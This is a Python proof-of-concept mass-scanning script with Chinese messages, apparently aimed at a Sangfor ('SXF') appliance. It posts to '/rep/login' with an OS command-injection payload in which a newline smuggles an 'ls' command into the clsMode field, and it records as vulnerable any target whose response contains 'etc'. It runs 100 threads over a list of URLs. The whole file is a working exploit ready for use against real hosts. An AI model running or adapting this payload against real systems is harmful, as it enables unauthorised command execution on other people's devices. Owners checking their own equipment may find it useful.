import requests
import argparse
import sys,urllib3
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告

def banner():
    demo = """
██╗  ██╗███████╗███████╗
╚██╗██╔╝██╔════╝██╔════╝
 ╚███╔╝ ███████╗█████╗  
 ██╔██╗ ╚════██║██╔══╝  
██╔╝ ██╗███████║██║     
╚═╝  ╚═╝╚══════╝╚═╝     
                           
                        """
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    banner()
    parser = argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/rep/login'
    headers = {
        "Connection": "close",
        "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    data = 'clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if 'etc' in res.text:
            print(f'[+]{target}存在漏洞')
            with open('result-SXF.txt','a',encoding='utf-8')as ff:
                ff.write(f'[+]{target}存在漏洞'+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception:
        print(f"{target}该站点存在问题!")

if __name__ == '__main__':
    main()